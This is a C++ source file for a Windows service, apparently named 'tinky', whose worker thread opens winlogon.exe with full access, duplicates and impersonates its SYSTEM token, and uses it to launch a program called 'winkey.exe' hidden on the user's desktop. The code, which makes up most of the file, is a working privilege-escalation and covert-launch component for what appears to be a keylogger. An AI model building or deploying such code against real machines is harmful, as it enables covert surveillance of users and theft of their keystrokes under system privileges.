#include "tinky.h"

SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_ServiceStatusHandle = NULL;
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;
PROCESS_INFORMATION g_ProcessInfo = {0};
HANDLE g_WorkerThread = NULL;

/*#############################################################################
# Service Implementation Methods
#############################################################################*/

DWORD WINAPI WorkerThreadRoutine(LPVOID lpParam)
{
	(void)lpParam; // Unused parameter
	DebugLogToFile("Worker thread started.");

	DWORD pid = GetProcessIdByName("winlogon.exe");
	if (pid == 0) {
		DebugLogToFile("Failed to get process ID for winlogon.exe");
		return 1;
	}

	DebugLogToFile("Winlogon.exe, PID: " + std::to_string(pid));

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
		DebugLogToFile("Failed to open process for winlogon.exe");
		return 1;
	}

	HANDLE hToken = NULL;
	OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
	if (hToken == NULL) {
		DebugLogToFile("Failed to open process token for winlogon.exe");
		CloseHandle(hProcess);
		return 1;
	}

	HANDLE hDuplicatedToken = NULL;
	if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicatedToken) == 0) {
		std::stringstream errorMessage;
		errorMessage << "Failed to duplicate token for winlogon.exe: " << GetErrorMessage();
		DebugLogToFile(errorMessage.str());
		CloseHandle(hToken);
		CloseHandle(hProcess);
		return 1;
	}

	if (!ImpersonateLoggedOnUser(hDuplicatedToken)) {
		std::stringstream errorMessage;
		errorMessage << "Failed to impersonate logged on user: " << GetErrorMessage();
		DebugLogToFile(errorMessage.str());
		CloseHandle(hDuplicatedToken);
		CloseHandle(hToken);
		CloseHandle(hProcess);
		return 1;
	}

	TCHAR currentPath[MAX_PATH];
	TCHAR commandLine[MAX_PATH];
	TCHAR currentDirectory[MAX_PATH];

	if (!GetModuleFileName(NULL, currentPath, MAX_PATH)) {
		DebugLogToFile("GetModuleFileName failed: " + std::string(GetErrorMessage()));
		CloseHandle(hDuplicatedToken);
		CloseHandle(hToken);
		CloseHandle(hProcess);
		return 1;
	}

	DebugLogToFile("Current path: " + std::string(currentPath));

	_tcscpy_s(currentDirectory, MAX_PATH, currentPath);
	PathRemoveFileSpec(currentDirectory);
	DebugLogToFile("Service directory: " + std::string(currentDirectory));

	PathRemoveFileSpec(currentDirectory);
	DebugLogToFile("Parent directory: " + std::string(currentDirectory));

	// Build test.exe path: C:\path\to\test.exe
	_tcscpy_s(commandLine, MAX_PATH, currentDirectory);
	// PathAppend(commandLine, _T("test.exe"));
	PathAppend(commandLine, _T("winkey\\winkey.exe"));
	DebugLogToFile("Test executable path: " + std::string(commandLine));

	STARTUPINFO si = {0};
	si.cb = sizeof(si);
	si.lpDesktop = _T("winsta0\\default");
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

	if (!CreateProcessAsUser(hDuplicatedToken, 
		NULL, 
		commandLine, 
		NULL, 
		NULL, 
		FALSE, 
		CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, 
		NULL, 
		currentDirectory, 
		&si, 
		&g_ProcessInfo)) {
		
		std::stringstream errorMessage;
		errorMessage << "Failed to create process as user: " << GetErrorMessage();
		DebugLogToFile(errorMessage.str());
	} else {
		DebugLogToFile("Process created successfully");
	}

	    // Wait for the service to stop or the process to exit
    HANDLE handles[2] = { g_ServiceStopEvent, g_ProcessInfo.hProcess };
    DWORD waitResult = WaitForMultipleObjects(2, handles, FALSE, INFINITE);

    if (waitResult == WAIT_OBJECT_0)
    {
        // Service stopped, close the process
        TerminateProcess(g_ProcessInfo.hProcess, 0);
    }

    CloseHandle(g_ProcessInfo.hProcess);
    CloseHandle(g_ProcessInfo.hThread);

	// Revert impersonation
	RevertToSelf();

	CloseHandle(hDuplicatedToken);
	CloseHandle(hToken);
	CloseHandle(hProcess);

	return 0;
}

static void ServiceControlHandler(DWORD control)
{
	switch (control) {
		case SERVICE_CONTROL_STOP:
			if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING) {
				break; // Service is not running
			}

			g_ServiceStatus.dwControlsAccepted = 0;
			g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
			g_ServiceStatus.dwCheckPoint = 4;
			g_ServiceStatus.dwWin32ExitCode = NO_ERROR;
			SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);
			
			// **FIXED: Proper cleanup**
			DebugLogToFile("Service stop requested - cleaning up processes");
			
			// Terminate spawned process if it's still running
			if (g_ProcessInfo.hProcess != NULL) {
				DebugLogToFile("Terminating spawned process");
				TerminateProcess(g_ProcessInfo.hProcess, 0);
				WaitForSingleObject(g_ProcessInfo.hProcess, 5000); // Wait max 5 seconds
				CloseHandle(g_ProcessInfo.hProcess);
				CloseHandle(g_ProcessInfo.hThread);
				ZeroMemory(&g_ProcessInfo, sizeof(g_ProcessInfo));
			}
			
			if (g_WorkerThread != NULL) {
				DebugLogToFile("Waiting for worker thread to complete");
				WaitForSingleObject(g_WorkerThread, INFINITE);
				CloseHandle(g_WorkerThread);
				g_WorkerThread = NULL;
			}

			SetEvent(g_ServiceStopEvent);
			break;

		default:
			break;
	}
}

void ServiceMain(DWORD argc, LPTSTR *argv)
{
	(void)argc; // Unused parameter
	(void)argv; // Unused parameter
	// Service main function implementation

	g_ServiceStatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceControlHandler);
	if (g_ServiceStatusHandle == NULL) {
		std::cout << "RegisterServiceCtrlHandler failed: " << GetErrorMessage() << std::endl;
		return ;
	}

	ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
	g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	g_ServiceStatus.dwWin32ExitCode = NO_ERROR;
	g_ServiceStatus.dwServiceSpecificExitCode = 0;

	if (!SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus)) {
		std::cout << "SetServiceStatus failed: " << GetErrorMessage() << std::endl;
		return;
	}

	g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (g_ServiceStopEvent == NULL) {
		g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		g_ServiceStatus.dwWin32ExitCode = GetLastError();
		g_ServiceStatus.dwCheckPoint = 1;
		SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);
		std::cout << "CreateEvent failed: " << GetErrorMessage() << std::endl;
		return;
	}

	g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	g_ServiceStatus.dwCheckPoint = 0;
	if (!SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus)) {
		if (g_ServiceStopEvent != INVALID_HANDLE_VALUE) {
			CloseHandle(g_ServiceStopEvent);
			g_ServiceStopEvent = INVALID_HANDLE_VALUE;
		}
		std::cout << "SetServiceStatus failed: " << GetErrorMessage() << std::endl;
		return;
	}
	// Service is now running, perform service tasks here
	// For demonstration, we will just wait for the stop event
	DebugLogToFile("Service has started.");
	g_WorkerThread = CreateThread(NULL, 0, WorkerThreadRoutine, NULL, 0, NULL);
	if (g_WorkerThread == NULL) {
		std::cout << "CreateThread failed: " << GetErrorMessage() << std::endl;
		g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		g_ServiceStatus.dwWin32ExitCode = GetLastError();
		g_ServiceStatus.dwCheckPoint = 1;
		SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);
		return;
	}

	WaitForSingleObject(g_ServiceStopEvent, INFINITE);

	DebugLogToFile("Waiting for worker thread to complete");
	WaitForSingleObject(g_WorkerThread, INFINITE); // Wait indefinitely
	CloseHandle(g_WorkerThread);

	if (g_ServiceStopEvent != INVALID_HANDLE_VALUE) {
		CloseHandle(g_ServiceStopEvent);
		g_ServiceStopEvent = INVALID_HANDLE_VALUE;
	}

	g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	g_ServiceStatus.dwCheckPoint = 0;
	if (!SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus)) {
		std::cout << "SetServiceStatus failed: " << GetErrorMessage() << std::endl;
	}

	DebugLogToFile("Service has stopped");
}
